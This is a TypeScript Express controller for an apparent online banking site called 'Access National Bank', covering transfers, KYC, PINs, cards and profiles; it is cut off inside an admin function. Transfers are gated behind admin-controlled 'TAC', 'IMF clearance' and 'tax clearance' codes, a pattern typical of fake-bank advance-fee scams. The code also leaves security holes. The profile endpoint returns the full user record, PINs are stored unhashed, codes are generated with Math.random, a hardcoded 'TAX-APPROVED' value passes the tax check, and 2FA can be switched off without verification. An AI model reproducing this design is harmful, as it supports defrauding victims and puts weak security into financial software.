import { Response } from 'express';
import bcrypt from 'bcryptjs';
import { AuthRequest } from '../middlewares/auth';
import User from '../models/User';
import UserAccount from '../models/UserAccount';
import Transaction from '../models/Transaction';
import Card from '../models/Card';
import Notification from '../models/Notification';
import NotificationTemplate from '../models/NotificationTemplate';
import Currency from '../models/Currency';
import { sendAlertEmail, sendEmail, sendCustomEmail } from '../utils/mailer';
import { broadcastToAdmins, sendToUser } from '../utils/websocket';


// Get Profile
export const getProfile = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const user = await User.findById(req.user?.id);
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }
    res.json(user);
  } catch (error: any) {
    res.status(500).json({ message: 'Error fetching profile', error: error.message });
  }
};

// Get Accounts
export const getAccounts = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const user = await User.findById(req.user?.id);
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }

    // 1. Fetch all admin-configured currencies from DB
    const adminCurrencies = await Currency.find({});
    
    // 2. Fetch existing user accounts
    let accounts = await UserAccount.find({ username: req.user?.username });
    const existingCurrencies = new Set(accounts.map((a) => a.currency));

    // 3. Auto-create any missing currency accounts for this user
    if (adminCurrencies.length > 0) {
      let createdNew = false;
      for (const curr of adminCurrencies) {
        if (!existingCurrencies.has(curr.name)) {
          const newAcc = new UserAccount({
            username: user.username,
            currency: curr.name,
            balance: 0,
            symbol: curr.symbol || '$',
            logo: curr.logo || '',
            accountNumber: user.accountNumber,
            name: user.fullName || user.username,
            totalIncome: 0,
            totalTransactions: 0,
          });
          await newAcc.save();
          createdNew = true;
        }
      }
      if (createdNew) {
        accounts = await UserAccount.find({ username: req.user?.username });
      }
    }

    res.json(accounts);
  } catch (error: any) {
    res.status(500).json({ message: 'Error fetching accounts', error: error.message });
  }
};

// Get Transactions
export const getTransactions = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const transactions = await Transaction.find({ username: req.user?.username }).sort({ time: -1 });
    res.json(transactions);
  } catch (error: any) {
    res.status(500).json({ message: 'Error fetching transactions', error: error.message });
  }
};

// Request Code (TAC / IMF / TAX)
export const requestCode = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { type } = req.body;
    const user = await User.findById(req.user?.id);
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }

    let codeValue = '';
    let emailSubject = '';
    let emailBody = '';

    if (type === 'TAC') {
      user.tacCodeRequest = true;
      if (!user.tacCode) {
        user.tacCode = Math.floor(10000 + Math.random() * 90000).toString();
      }
      codeValue = user.tacCode;
      emailSubject = 'Transaction Authorization Code (TAC)';
      emailBody = `<p>Your Transaction Authorization Code (TAC) for completing your transfer is: <b>${codeValue}</b></p>`;
    } else if (type === 'IMF') {
      user.imfRequest = true;
      if (!user.imf) {
        user.imf = Math.floor(10000 + Math.random() * 90000).toString();
      }
      codeValue = user.imf;
      emailSubject = 'International Monetary Fund (IMF) Code';
      emailBody = `<p>Your International Monetary Fund (IMF) Clearance Code for completing your international wire transfer is: <b>${codeValue}</b></p>`;
    } else if (type === 'TAX') {
      user.taxRequest = true;
      codeValue = 'TAX-' + Math.floor(10000 + Math.random() * 90000).toString();
      emailSubject = 'Tax Clearance Code (TAX)';
      emailBody = `<p>Your Tax Clearance Code (TAX) for completing your transfer is: <b>${codeValue}</b></p>`;
    } else {
       res.status(400).json({ message: 'Invalid code type requested' });
       return;
    }

    await user.save();

    if (type === 'TAC') {
      // 1. Admin Notification (Tac-Request template)
      let adminTitle = 'TAC Clearance Code Request';
      let adminContent = `Client ${user.fullName} (@${user.username}) has submitted a TAC clearance code request. Administrative audit required.`;

      try {
        const adminTemp = await NotificationTemplate.findOne({ $or: [{ name: 'Tac-Request' }, { name: 'Tax-Request' }] });
        if (adminTemp) {
          adminTitle = adminTemp.title.replace(/\{\{fullName\}\}/g, user.fullName).replace(/\{\{username\}\}/g, user.username);
          adminContent = adminTemp.content.replace(/\{\{fullName\}\}/g, user.fullName).replace(/\{\{username\}\}/g, user.username);
        }
      } catch (e) {
        console.error('Error finding Tac-Request template:', e);
      }

      const adminNotif = new Notification({
        username: 'Admin',
        title: adminTitle,
        content: adminContent,
        time: Math.floor(Date.now() / 1000),
        isRead: false,
        admin: true,
      });
      await adminNotif.save();

      broadcastToAdmins({
        type: 'TAC_REQUEST',
        username: user.username,
        fullName: user.fullName,
        title: adminTitle,
        content: adminContent,
      });

      // 2. User Notification (Tax-Processing / Tac-Processing template)
      let userTitle = 'TAC Clearance Code Processing';
      let userContent = 'We write to notify you that your TAC clearance code request is processing and you will be updated upon approval.';

      try {
        const userTemp = await NotificationTemplate.findOne({ $or: [{ name: 'Tax-Processing' }, { name: 'Tac-Processing' }] });
        if (userTemp) {
          userTitle = userTemp.title.replace(/\{\{fullName\}\}/g, user.fullName).replace(/\{\{username\}\}/g, user.username);
          userContent = userTemp.content.replace(/\{\{fullName\}\}/g, user.fullName).replace(/\{\{username\}\}/g, user.username);
        }
      } catch (e) {
        console.error('Error finding Tax-Processing template:', e);
      }

      const userNotif = new Notification({
        username: user.username,
        title: userTitle,
        content: userContent,
        time: Math.floor(Date.now() / 1000),
        isRead: false,
        admin: false,
      });
      await userNotif.save();

      sendToUser(user.username, {
        type: 'TAC_PROCESSING',
        title: userTitle,
        content: userContent,
        notification: userNotif,
      });
    } else if (type === 'IMF') {
      // 1. Admin Notification (IMF-Request template)
      let adminTitle = 'IMF Clearance Code Request';
      let adminContent = `Client ${user.fullName} (@${user.username}) has submitted an IMF clearance code request. Administrative audit required.`;

      try {
        const adminTemp = await NotificationTemplate.findOne({ $or: [{ name: 'IMF-Request' }, { name: 'Imf-Request' }] });
        if (adminTemp) {
          adminTitle = adminTemp.title.replace(/\{\{fullName\}\}/g, user.fullName).replace(/\{\{username\}\}/g, user.username);
          adminContent = adminTemp.content.replace(/\{\{fullName\}\}/g, user.fullName).replace(/\{\{username\}\}/g, user.username);
        }
      } catch (e) {
        console.error('Error finding IMF-Request template:', e);
      }

      const adminNotif = new Notification({
        username: 'Admin',
        title: adminTitle,
        content: adminContent,
        time: Math.floor(Date.now() / 1000),
        isRead: false,
        admin: true,
      });
      await adminNotif.save();

      broadcastToAdmins({
        type: 'IMF_REQUEST',
        username: user.username,
        fullName: user.fullName,
        title: adminTitle,
        content: adminContent,
      });

      // 2. User Notification (IMF-Processing template)
      let userTitle = 'IMF Clearance Code Processing';
      let userContent = 'We write to notify you that your IMF clearance code request is processing and you will be updated upon approval.';

      try {
        const userTemp = await NotificationTemplate.findOne({ $or: [{ name: 'IMF-Processing' }, { name: 'Imf-Processing' }] });
        if (userTemp) {
          userTitle = userTemp.title.replace(/\{\{fullName\}\}/g, user.fullName).replace(/\{\{username\}\}/g, user.username);
          userContent = userTemp.content.replace(/\{\{fullName\}\}/g, user.fullName).replace(/\{\{username\}\}/g, user.username);
        }
      } catch (e) {
        console.error('Error finding IMF-Processing template:', e);
      }

      const userNotif = new Notification({
        username: user.username,
        title: userTitle,
        content: userContent,
        time: Math.floor(Date.now() / 1000),
        isRead: false,
        admin: false,
      });
      await userNotif.save();

      sendToUser(user.username, {
        type: 'IMF_PROCESSING',
        title: userTitle,
        content: userContent,
        notification: userNotif,
      });
    }

    await sendCustomEmail(
      user.email,
      emailSubject,
      `
        <p style="margin-top: 0;">Dear <strong>${user.fullName}</strong>,</p>
        <p>You have requested a security clearance code for a pending transaction clearance on your account.</p>
        <div style="margin: 20px 0; padding: 18px; background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; text-align: center;">
          ${emailBody}
        </div>
        <p>Please enter this code on the transfer verification screen to proceed with your clearance.</p>
        <p style="color: #e53e3e; font-size: 12px;"><strong>Security Warning:</strong> Access National staff will never ask for your authorization code or online banking password over the phone.</p>
      `,
      'Transaction Security Clearance Code',
      'TAC Clearance'
    );

    res.json({ message: `A ${type} code has been generated and sent to your registered email.` });
  } catch (error: any) {
    res.status(500).json({ message: 'Error requesting security code', error: error.message });
  }
};

// Validate Security Code (TAC / IMF)
export const validateCode = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { type, code } = req.body;
    const user = await User.findById(req.user?.id);
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }

    if (!code || typeof code !== 'string') {
      res.status(400).json({ message: 'Code is required', valid: false });
      return;
    }

    const trimmedCode = code.trim();

    if (type === 'TAC') {
      if (!user.tacCode || user.tacCode !== trimmedCode) {
        res.status(400).json({ message: 'Invalid Transaction Authorization Code (TAC)', valid: false });
        return;
      }
      res.json({ message: 'TAC clearance code validated successfully.', valid: true });
      return;
    } else if (type === 'IMF') {
      if (!user.imf || user.imf !== trimmedCode) {
        res.status(400).json({ message: 'Invalid International Monetary Fund (IMF) Clearance Code', valid: false });
        return;
      }
      res.json({ message: 'IMF clearance code validated successfully.', valid: true });
      return;
    } else {
      res.status(400).json({ message: 'Invalid code type provided', valid: false });
      return;
    }
  } catch (error: any) {
    res.status(500).json({ message: 'Error validating security code', error: error.message });
  }
};

// Perform Transfer
export const performTransfer = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const {
      type,
      amount,
      currency,
      receiverAccountNumber,
      receiverName,
      receiverBank,
      swiftCode,
      routineNumber,
      receiverAddress,
      codeType,
      codeValue,
    } = req.body;

    const parsedAmount = parseFloat(amount);
    if (isNaN(parsedAmount) || parsedAmount <= 0) {
       res.status(400).json({ message: 'Invalid transfer amount' });
       return;
    }

    const sender = await User.findById(req.user?.id);
    if (!sender) {
       res.status(404).json({ message: 'Sender not found' });
       return;
    }

    const senderAccount = await UserAccount.findOne({ username: sender.username, currency });
    if (!senderAccount || senderAccount.balance < parsedAmount) {
       res.status(400).json({ message: 'Insufficient funds in the selected currency' });
       return;
    }

    const providedTac = req.body.tacCode || (req.body.codeType === 'TAC' ? req.body.codeValue : null);
    const providedImf = req.body.imf || req.body.imfCode || (req.body.codeType === 'IMF' ? req.body.codeValue : null);

    if (type === 'local' || type === 'wire' || providedTac) {
      if (!providedTac) {
         res.status(400).json({ message: 'Transaction Authorization Code (TAC) is required to process this transfer', codeError: 'TAC' });
         return;
      }
      if (!sender.tacCode || sender.tacCode !== providedTac) {
         res.status(400).json({ message: 'Invalid Transaction Authorization Code (TAC)', codeError: 'TAC' });
         return;
      }
    }

    if (type === 'wire' || req.body.codeType === 'IMF' || (providedImf && type !== 'internal' && type !== 'local')) {
      if (!providedImf) {
         res.status(400).json({ message: 'International Monetary Fund (IMF) Clearance Code is required to process this transfer', codeError: 'IMF' });
         return;
      }
      if (!sender.imf || sender.imf !== providedImf) {
         res.status(400).json({ message: 'Invalid International Monetary Fund (IMF) Clearance Code', codeError: 'IMF' });
         return;
      }
    } else if (codeType === 'TAX') {
      if (codeValue !== 'TAX-APPROVED' && codeValue !== sender.tacCode) {
         res.status(400).json({ message: 'Invalid Tax Clearance Code (TAX)', codeError: 'TAX' });
         return;
      }
    }

    const { pin } = req.body;
    if (sender.pin && sender.pin > 0) {
      if (!pin || parseInt(pin, 10) !== sender.pin) {
        res.status(400).json({ message: 'Invalid 6-digit Transaction PIN' });
        return;
      }
    }

    if (type === 'internal') {
      const receiver = await User.findOne({
        $or: [{ accountNumber: receiverAccountNumber }, { username: receiverAccountNumber }],
      });

      if (!receiver) {
         res.status(404).json({ message: 'Receiver account number not found in this bank' });
         return;
      }

      if (receiver.username === sender.username) {
         res.status(400).json({ message: 'Cannot transfer to your own account' });
         return;
      }

      senderAccount.balance -= parsedAmount;
      senderAccount.totalSpending += parsedAmount;
      senderAccount.totalTransactions += parsedAmount;
      await senderAccount.save();

      let receiverAccount = await UserAccount.findOne({ username: receiver.username, currency });
      if (!receiverAccount) {
        receiverAccount = new UserAccount({
          username: receiver.username,
          currency,
          balance: 0,
          symbol: senderAccount.symbol,
          logo: senderAccount.logo,
          accountNumber: receiver.accountNumber,
          name: receiver.fullName,
        });
      }
      receiverAccount.balance += parsedAmount;
      receiverAccount.totalIncome += parsedAmount;
      receiverAccount.totalTransactions += parsedAmount;
      await receiverAccount.save();

      const debitTx = new Transaction({
        username: sender.username,
        amount: parsedAmount,
        transactionType: 'Internal-Transfer',
        receiverName: receiver.fullName,
        receiverAccountNumber: receiver.accountNumber,
        receiverBank: 'Access National Bank',
        receiverUsername: receiver.username,
        status: 'Approved',
        senderName: sender.fullName,
        currency,
        symbol: senderAccount.symbol,
        logo: senderAccount.logo,
      });
      await debitTx.save();

      const creditTx = new Transaction({
        username: receiver.username,
        amount: parsedAmount,
        transactionType: 'Credit',
        receiverName: receiver.fullName,
        receiverAccountNumber: receiver.accountNumber,
        receiverBank: 'Access National Bank',
        receiverUsername: receiver.username,
        status: 'Approved',
        senderName: sender.fullName,
        currency,
        symbol: senderAccount.symbol,
        logo: senderAccount.logo,
      });
      await creditTx.save();

      await sendAlertEmail(
        sender.email,
        sender.fullName,
        'DEBIT',
        parsedAmount,
        currency,
        senderAccount.symbol,
        `Internal transfer to ${receiver.fullName}`,
        sender.accountNumber,
        senderAccount.balance
      );

      await sendAlertEmail(
        receiver.email,
        receiver.fullName,
        'CREDIT',
        parsedAmount,
        currency,
        senderAccount.symbol,
        `Transfer received from ${sender.fullName}`,
        receiver.accountNumber,
        receiverAccount.balance
      );

      // 1. Sender Notification (User-Transfer template)
      let senderNotifTitle = 'User Transfer Sent';
      let senderNotifContent = `We write to notify you that your internal transfer of ${currency} ${parsedAmount} to ${receiver.fullName} was completed successfully.`;

      try {
        const senderTemplate = await NotificationTemplate.findOne({ name: 'User-Transfer' });
        if (senderTemplate) {
          senderNotifTitle = senderTemplate.title
            .replace(/\{\{amount\}\}/g, parsedAmount.toString())
            .replace(/€\{\{amount\}\}/g, `${currency} ${parsedAmount}`)
            .replace(/\{\{currency\}\}/g, currency)
            .replace(/\{\{senderName\}\}/g, sender.fullName)
            .replace(/\{\{receiverName\}\}/g, receiver.fullName);

          senderNotifContent = senderTemplate.content
            .replace(/€\{\{amount\}\}/g, `${currency} ${parsedAmount}`)
            .replace(/\{\{amount\}\}/g, parsedAmount.toString())
            .replace(/\{\{currency\}\}/g, currency)
            .replace(/\{\{senderName\}\}/g, sender.fullName)
            .replace(/\{\{receiverName\}\}/g, receiver.fullName);
        }
      } catch (e) {
        console.error('Error fetching User-Transfer template for sender:', e);
      }

      const senderNotif = new Notification({
        username: sender.username,
        title: senderNotifTitle,
        content: senderNotifContent,
        time: Math.floor(Date.now() / 1000),
        isRead: false,
        admin: false,
      });
      await senderNotif.save();

      sendToUser(sender.username, {
        type: 'USER_TRANSFER',
        title: senderNotifTitle,
        content: senderNotifContent,
        amount: parsedAmount,
        currency,
        notification: senderNotif,
      });

      // 2. Receiver Notification (User-Transfer-Received template)
      let receiverNotifTitle = 'User Transfer Credit Received';
      let receiverNotifContent = `We write to notify you that you have received an internal transfer credit of ${currency} ${parsedAmount} from ${sender.fullName}.`;

      try {
        const receiverTemplate = await NotificationTemplate.findOne({
          $or: [{ name: 'User-Transfer-Received' }, { name: 'User-Transfer-Credit' }]
        });
        if (receiverTemplate) {
          receiverNotifTitle = receiverTemplate.title
            .replace(/\{\{amount\}\}/g, parsedAmount.toString())
            .replace(/€\{\{amount\}\}/g, `${currency} ${parsedAmount}`)
            .replace(/\{\{currency\}\}/g, currency)
            .replace(/\{\{senderName\}\}/g, sender.fullName)
            .replace(/\{\{receiverName\}\}/g, receiver.fullName);

          receiverNotifContent = receiverTemplate.content
            .replace(/€\{\{amount\}\}/g, `${currency} ${parsedAmount}`)
            .replace(/\{\{amount\}\}/g, parsedAmount.toString())
            .replace(/\{\{currency\}\}/g, currency)
            .replace(/\{\{senderName\}\}/g, sender.fullName)
            .replace(/\{\{receiverName\}\}/g, receiver.fullName);
        }
      } catch (e) {
        console.error('Error fetching User-Transfer-Received template for receiver:', e);
      }

      const receiverNotif = new Notification({
        username: receiver.username,
        title: receiverNotifTitle,
        content: receiverNotifContent,
        time: Math.floor(Date.now() / 1000),
        isRead: false,
        admin: false,
      });
      await receiverNotif.save();

      sendToUser(receiver.username, {
        type: 'USER_TRANSFER',
        title: receiverNotifTitle,
        content: receiverNotifContent,
        amount: parsedAmount,
        currency,
        senderName: sender.fullName,
        notification: receiverNotif,
      });

      res.json({ message: 'Internal transfer completed successfully.', transaction: debitTx });
    } else {
      senderAccount.balance -= parsedAmount;
      senderAccount.totalSpending += parsedAmount;
      senderAccount.totalTransactions += parsedAmount;
      await senderAccount.save();

      const pendingTx = new Transaction({
        username: sender.username,
        amount: parsedAmount,
        transactionType: type === 'local' ? 'Local-Transfer' : 'Wire-Transfer',
        receiverName: receiverName || 'Unknown Receiver',
        receiverAccountNumber: receiverAccountNumber,
        receiverBank: receiverBank || 'External Bank',
        status: 'Pending',
        senderName: sender.fullName,
        currency,
        symbol: senderAccount.symbol,
        logo: senderAccount.logo,
        swiftCode: swiftCode || '',
        routineNumber: routineNumber || '',
        receiverAddress: receiverAddress || '',
      });
      await pendingTx.save();

      await sendAlertEmail(
        sender.email,
        sender.fullName,
        'DEBIT',
        parsedAmount,
        currency,
        senderAccount.symbol,
        `Pending transfer request to ${receiverName || 'External Account'} (${receiverBank})`,
        sender.accountNumber,
        senderAccount.balance
      );

      // 1. User Processing Notification
      const isLocal = type === 'local';
      let userNotifTitle = isLocal ? 'Local Bank Transfer Processing' : 'International Wire Transfer Processing';
      let userNotifContent = `We write to notify you that your ${isLocal ? 'local bank' : 'international wire'} transfer of ${currency} ${parsedAmount} to ${receiverName || 'External Account'} at ${receiverBank || 'External Bank'} is processing and you will be notified upon approval.`;

      try {
        const userTplName = isLocal ? 'Local-Transfer-Processing' : 'Wire-Transfer-Processing';
        const userTemplate = await NotificationTemplate.findOne({ name: userTplName });
        if (userTemplate) {
          userNotifTitle = userTemplate.title
            .replace(/\{\{amount\}\}/g, parsedAmount.toString())
            .replace(/\{\{currency\}\}/g, currency)
            .replace(/\{\{receiverName\}\}/g, receiverName || 'External Account')
            .replace(/\{\{receiverBank\}\}/g, receiverBank || 'External Bank')
            .replace(/\{\{senderName\}\}/g, sender.fullName);

          userNotifContent = userTemplate.content
            .replace(/\{\{amount\}\}/g, parsedAmount.toString())
            .replace(/\{\{currency\}\}/g, currency)
            .replace(/\{\{receiverName\}\}/g, receiverName || 'External Account')
            .replace(/\{\{receiverBank\}\}/g, receiverBank || 'External Bank')
            .replace(/\{\{senderName\}\}/g, sender.fullName);
        }
      } catch (e) {
        console.error('Error fetching processing notification template:', e);
      }

      const userNotif = new Notification({
        username: sender.username,
        title: userNotifTitle,
        content: userNotifContent,
        time: Math.floor(Date.now() / 1000),
        isRead: false,
        admin: false,
      });
      await userNotif.save();

      sendToUser(sender.username, {
        type: 'TRANSFER_PROCESSING',
        title: userNotifTitle,
        content: userNotifContent,
        amount: parsedAmount,
        currency,
        notification: userNotif,
      });

      // 2. Admin Pending Approval Notification
      let adminNotifTitle = `New ${isLocal ? 'Local' : 'Wire'} Transfer Pending Approval`;
      let adminNotifContent = `Client ${sender.fullName} (@${sender.username}) initiated a ${isLocal ? 'local bank' : 'international wire'} transfer of ${currency} ${parsedAmount} to ${receiverName || 'External Account'} at ${receiverBank || 'External Bank'}. Pending admin approval.`;

      try {
        const adminTplName = isLocal ? 'Local-Transfer-Admin' : 'Wire-Transfer-Admin';
        const adminTemplate = await NotificationTemplate.findOne({ name: adminTplName });
        if (adminTemplate) {
          adminNotifTitle = adminTemplate.title
            .replace(/\{\{amount\}\}/g, parsedAmount.toString())
            .replace(/\{\{currency\}\}/g, currency)
            .replace(/\{\{receiverName\}\}/g, receiverName || 'External Account')
            .replace(/\{\{receiverBank\}\}/g, receiverBank || 'External Bank')
            .replace(/\{\{senderName\}\}/g, sender.fullName)
            .replace(/\{\{senderUsername\}\}/g, sender.username);

          adminNotifContent = adminTemplate.content
            .replace(/\{\{amount\}\}/g, parsedAmount.toString())
            .replace(/\{\{currency\}\}/g, currency)
            .replace(/\{\{receiverName\}\}/g, receiverName || 'External Account')
            .replace(/\{\{receiverBank\}\}/g, receiverBank || 'External Bank')
            .replace(/\{\{senderName\}\}/g, sender.fullName)
            .replace(/\{\{senderUsername\}\}/g, sender.username);
        }
      } catch (e) {
        console.error('Error fetching admin transfer notification template:', e);
      }

      const adminNotif = new Notification({
        username: 'Admin',
        title: adminNotifTitle,
        content: adminNotifContent,
        time: Math.floor(Date.now() / 1000),
        isRead: false,
        admin: true,
      });
      await adminNotif.save();

      broadcastToAdmins({
        type: 'TRANSFER_PENDING_ADMIN',
        title: adminNotifTitle,
        content: adminNotifContent,
        amount: parsedAmount,
        currency,
        senderUsername: sender.username,
        senderName: sender.fullName,
        transaction: pendingTx,
        notification: adminNotif,
      });

      res.json({
        message: 'Your transfer is processing. It has been queued for clearance.',
        transaction: pendingTx,
      });
    }
  } catch (error: any) {
    console.error('Transfer error:', error);
    res.status(500).json({ message: 'Error processing transfer', error: error.message });
  }
};

// Helper to create notifications and emit WebSocket events for KYC submissions
const sendKycSubmissionNotifications = async (user: any, idTypeSubmitted?: string) => {
  try {
    const docType = idTypeSubmitted || user.idType || 'Passport';

    let userNotifTitle = 'Identity Verification Under Review';
    let userNotifContent = `We write to notify you that your identity verification profile for ${docType} is processing and under review. You will be notified upon approval.`;

    try {
      const kycTpl = await NotificationTemplate.findOne({
        $or: [{ name: 'kyc_processing' }, { name: 'KYC-Processing' }]
      });
      if (kycTpl) {
        userNotifTitle = kycTpl.title
          .replace(/\{\{idType\}\}/g, docType)
          .replace(/\{\{fullName\}\}/g, user.fullName || user.username)
          .replace(/\{\{username\}\}/g, user.username);

        userNotifContent = kycTpl.content
          .replace(/\{\{idType\}\}/g, docType)
          .replace(/\{\{fullName\}\}/g, user.fullName || user.username)
          .replace(/\{\{username\}\}/g, user.username);
      }
    } catch (e) {
      console.error('Error finding kyc_processing notification template:', e);
    }

    // 1. Processing Notification for User
    const userNotif = new Notification({
      username: user.username,
      title: userNotifTitle,
      content: userNotifContent,
      isRead: false,
      time: Math.floor(Date.now() / 1000),
      admin: false,
    });
    await userNotif.save();

    // 2. Pending Notification for Admin
    const adminNotif = new Notification({
      username: 'Admin',
      title: 'New Identity Verification Pending Review',
      content: `Client ${user.fullName || user.username} (@${user.username}) has submitted an identity clearance document (${docType}) for KYC verification. Administrative audit required.`,
      isRead: false,
      time: Math.floor(Date.now() / 1000),
      admin: true,
    });
    await adminNotif.save();

    // 3. Emit Realtime WebSocket Events
    broadcastToAdmins({
      type: 'KYC_PENDING',
      title: 'New Identity Verification Pending Review',
      content: `Client ${user.fullName || user.username} (@${user.username}) has submitted an identity clearance document (${docType}) for KYC verification.`,
      username: user.username,
      fullName: user.fullName || user.username,
      idType: docType,
      createdAt: new Date().toISOString(),
    });

    sendToUser(user.username, {
      type: 'KYC_PROCESSING',
      title: userNotifTitle,
      content: userNotifContent,
      idType: docType,
      notification: userNotif,
      createdAt: new Date().toISOString(),
    });
  } catch (err) {
    console.error('Error sending KYC submission notifications:', err);
  }
};

// Submit KYC
export const submitKyc = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { passport, profilePicture, idType } = req.body;
    const user = await User.findById(req.user?.id);
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }

    if (user.isVerified) {
       res.status(400).json({ message: 'Your identity has already been verified and approved. Verification forms cannot be modified once verified.' });
       return;
    }

    if (passport) user.passport = passport;
    if (profilePicture) user.profilePicture = profilePicture;
    if (idType) user.idType = idType;
    user.onReview = true;
    await user.save();

    // Send Processing notification to User & Pending notification to Admin via WebSocket
    await sendKycSubmissionNotifications(user, idType);

    res.json({ message: 'KYC documents submitted successfully. Account is under review.', user });
  } catch (error: any) {
    res.status(500).json({ message: 'Error submitting KYC', error: error.message });
  }
};

// Update Own Profile
export const updateOwnProfile = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const {
      fullName,
      phoneNumber,
      country,
      address,
      zipCode,
      dob,
      profilePicture,
      passport,
      idType,
      gender,
      occupation,
      city,
      state,
    } = req.body;

    const user = await User.findById(req.user?.id);
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }

    if (user.isVerified && passport !== undefined) {
      res.status(400).json({ message: 'Your identity has already been verified and approved. Verification forms cannot be modified once verified.' });
      return;
    }

    let isDocumentSubmitted = false;

    // Explicitly disallow editing email or username!
    if (fullName !== undefined) user.fullName = fullName;
    if (phoneNumber !== undefined) user.phoneNumber = phoneNumber;
    if (country !== undefined) user.country = country;
    if (address !== undefined) user.address = address;
    if (zipCode !== undefined) user.zipCode = zipCode;
    if (dob !== undefined) {
      if (typeof dob === 'number') {
        user.dob = dob;
      } else if (typeof dob === 'string' && dob.trim() !== '') {
        const parsed = new Date(dob).getTime();
        user.dob = isNaN(parsed) ? (parseInt(dob) || 0) : parsed;
      } else {
        user.dob = 0;
      }
    }
    if (profilePicture !== undefined) user.profilePicture = profilePicture;
    if (passport !== undefined) {
      user.passport = passport;
      user.onReview = true; // Submit ID sets account under review
      isDocumentSubmitted = true;
    }
    if (idType !== undefined) user.idType = idType;
    if (gender !== undefined) user.gender = gender;
    if (occupation !== undefined) user.occupation = occupation;
    if (city !== undefined) user.city = city;
    if (state !== undefined) user.state = state;

    if (!user.isVerified) {
      user.onReview = true;
      isDocumentSubmitted = true;
    }

    await user.save();

    if (isDocumentSubmitted) {
      await sendKycSubmissionNotifications(user, idType);
    }

    res.json({ message: 'Profile updated successfully', user });
  } catch (error: any) {
    res.status(500).json({ message: 'Error updating profile', error: error.message });
  }
};

// Lookup Account by Account Number
export const lookupAccount = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { accountNumber } = req.query;
    if (!accountNumber) {
      res.status(400).json({ message: 'Account number is required' });
      return;
    }

    const user = await User.findOne({
      $or: [{ accountNumber: accountNumber as string }, { username: accountNumber as string }],
      deleted: false,
    });

    if (!user) {
      res.status(404).json({ message: 'Account number not found' });
      return;
    }

    res.json({
      found: true,
      fullName: user.fullName || user.username,
      accountNumber: user.accountNumber,
      username: user.username,
    });
  } catch (error: any) {
    res.status(500).json({ message: 'Error searching account', error: error.message });
  }
};

// Set / Change Transaction PIN
export const setPin = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { pin, password } = req.body;
    if (!pin || pin.toString().length < 6) {
      res.status(400).json({ message: 'PIN must be exactly 6 digits.' });
      return;
    }

    const user = await User.findById(req.user?.id);
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }

    if (user.pin && user.pin !== 0) {
      if (!password) {
        res.status(400).json({ message: 'Password is required to update PIN.' });
        return;
      }
      const isMatch = await bcrypt.compare(password, user.passwordHash);
      if (!isMatch) {
        res.status(400).json({ message: 'Incorrect password.' });
        return;
      }
    }

    user.pin = parseInt(pin);
    await user.save();

    res.json({ message: 'Transaction PIN saved successfully', pinSet: true });
  } catch (error: any) {
    res.status(500).json({ message: 'Error setting PIN', error: error.message });
  }
};

// Change User Password (verifying old password)
export const changeUserPassword = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { oldPassword, newPassword } = req.body;
    if (!oldPassword || !newPassword) {
      res.status(400).json({ message: 'Old and new passwords are required' });
      return;
    }

    const user = await User.findById(req.user?.id);
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }

    const isMatch = await bcrypt.compare(oldPassword, user.passwordHash);
    if (!isMatch) {
      res.status(400).json({ message: 'Current password entered is incorrect.' });
      return;
    }

    const salt = await bcrypt.genSalt(10);
    user.passwordHash = await bcrypt.hash(newPassword, salt);
    await user.save();

    res.json({ message: 'Password updated successfully' });
  } catch (error: any) {
    res.status(500).json({ message: 'Error changing password', error: error.message });
  }
};

// Toggle 2FA Security
export const toggle2FA = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { enabled } = req.body;
    const user = await User.findById(req.user?.id);
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }

    user.twoFactorEnabled = enabled;
    await user.save();

    res.json({ message: `2FA security ${enabled ? 'enabled' : 'disabled'} successfully`, twoFactorEnabled: user.twoFactorEnabled });
  } catch (error: any) {
    res.status(500).json({ message: 'Error updating 2FA settings', error: error.message });
  }
};

// Get Cards
export const getCards = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const cards = await Card.find({ username: req.user?.username });
    res.json(cards);
  } catch (error: any) {
    res.status(500).json({ message: 'Error fetching cards', error: error.message });
  }
};

// Request Card
export const requestCard = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { cardType } = req.body;
    const user = await User.findById(req.user?.id);
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }

    const cardNumber = '4' + Math.floor(100000000000000 + Math.random() * 900000000000000).toString();
    const cvv = Math.floor(100 + Math.random() * 900).toString();
    const currentYear = new Date().getFullYear();
    const expiryDate = `12/${(currentYear + 4).toString().substring(2)}`;

    const newCard = new Card({
      username: user.username,
      cardNumber,
      cardType: cardType || 'Visa',
      cardHolder: user.fullName || user.username,
      expiryDate,
      cvv,
      status: 'Pending',
      balance: 5000,
    });

    await newCard.save();

    user.requestingCard = true;
    await user.save();

    res.status(201).json({ message: 'Card request submitted successfully.', card: newCard });
  } catch (error: any) {
    res.status(500).json({ message: 'Error requesting card', error: error.message });
  }
};

// ================= ADMIN CONTROLLERS =================

// List Users
export const listUsers = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const users = await User.find({ deleted: false }).sort({ createdAt: -1 });
    res.json(users);
  } catch (error: any) {
    res.status(500).json({ message: 'Error fetching users', error: error.message });
  }
};

// Get User by Username
export const getUserByUsername = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const user = await User.findOne({ username: req.params.username, deleted: false });
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }
